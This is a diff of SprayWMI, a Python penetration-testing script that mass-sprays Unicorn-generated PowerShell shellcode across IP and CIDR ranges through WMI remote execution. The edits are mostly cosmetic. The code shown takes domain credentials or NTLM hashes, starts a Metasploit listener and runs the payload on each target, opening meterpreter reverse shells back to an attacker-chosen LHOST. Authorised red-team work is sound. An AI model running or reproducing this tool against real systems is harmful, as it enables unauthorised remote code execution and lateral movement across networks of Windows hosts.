@@ -5,17 +5,21 @@
 # .__/ |    |  \ /~~\  |  |/\|  |  | |
 #
 #
-# SprayWMI combines Unicorn PowerShell injection with WMI remote execution.
-# Be sure to configure the three options below for Unicorn and WMI paths. This is mandatory or will not work.
-#
 # Version 0.1
 #
-# Written by: David Kennedy (@HackingDave) - @TrustedSec
+# SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR notations.
+#
+# Written by: David Kennedy (@HackingDave) @TrustedSec
 # Special thanks to: Justin Elze and Larry Spohn @TrustedSec
 #
+# Initial blog post: https://www.trustedsec.com/june-2015/no_psexec_needed/
+# If you have trouble with this on 64-bit, try:
+# dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386
+#
+# Be sure to configure the three options below for Unicorn and WMI paths. This is mandatory or will not work.
 # Make sure to close meterpreter properly (exit or kill session) or else the server may spike high CPU - weirdness with PowerShell.
-
 # Configure the path to Unicorn: github.com/trustedsec/unicorn
+
 import subprocess
 import os
 import sys
@@ -31,9 +35,6 @@ if not os.path.isdir("/pentest/post-exploitation/unicorn/"):
 
 	unicorn = (definepath + "/unicorn/")
 				
-# Configure path to WMIs: www.trustedsec.com/june-2015/no_psexec_needed/
-# If you have trouble with this on 64-bit, try:
-# dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386
 wmi = ("./wmis")
 if os.path.isfile("wmis"):
 	subprocess.Popen("chmod +x wmis", shell=True).wait()
@@ -85,7 +86,7 @@ except IndexError:
 domain                 Domain you are attacking. If its local, just specify workgroup.
 username               Username to authenticate on the remote Windows system.
 password               Password or password hash LM:NTLM to use on the remote Windows system.
-CIDR range or file     Specify a single IP, CIDR range (192.168.1.1/24) or multiple CIDRs: 192.168.1.1/24,192.168.2.1/24. 
+CIDR range or file     Specify a single IP, CIDR range (10.0.1.1/24) or multiple CIDRs: 10.0.1.1/24,10.0.2.1/24. 
                           You can also specify a file (ex: ips.txt) that contains a single IP addresses on each line. 
 payload                Metasploit payload, example: windows/meterpreter/reverse_tcp
 LHOST                  Reverse shell IP address.
@@ -101,15 +102,15 @@ print ("[*] Launching SprayWMI on the hosts specified.")
 # Start Unicorn first.
 if os.path.isfile(unicorn + "/unicorn.py"):
 	os.chdir(unicorn)
-	print ("[*] Generating shellcode through Unicorn This could take a few seconds.")
+	print ("[*] Generating shellcode through Unicorn, this could take a few seconds.")
 	subprocess.Popen("python unicorn.py %s %s %s" % (meta, lhost, lport), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	if optional == "":
 		print ("[*] Launching the listener in the background.")	
 		time.sleep(1)
 		child = pexpect.spawn("msfconsole -r %s/unicorn.rc" % (unicorn))
-	        print ("[*] Waiting for the listener to start first before we continue forward.")
-	        print ("[*] Be patient, Metaploit takes a little bit to start.")
-	        child.expect("Starting the payload handler.", timeout=30000)
+	          print ("[*] Waiting for the listener to start first before we continue.")
+	          print ("[*] Be patient, Metasploit takes a little bit to start.")
+	          child.expect("Starting the payload handler.", timeout=30000)
 	unicorn_code = file(unicorn + "/powershell_attack.txt", "r").read()
 	# All back to normal.
 	os.chdir(definepath)
@@ -151,7 +152,7 @@ if counter == 1:
 	for ip in fileopen:
 		ip = ip.rstrip()
 		command = ('''%s -U %s/%s%%%s //%s "%s"''' % (wmi,domain,user,password,ip,unicorn_code))
-		print ("[*] Launching WMI spray against IP: %s - you should have a shell in the background. Once finished, a shell will spawn" % (ip))
+		print ("[*] Launching WMI spray against IP: %s - You should have a shell in the background. Once finished, a shell will spawn." % (ip))
 		if verbose == "off":
 			subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		if verbose == "on":
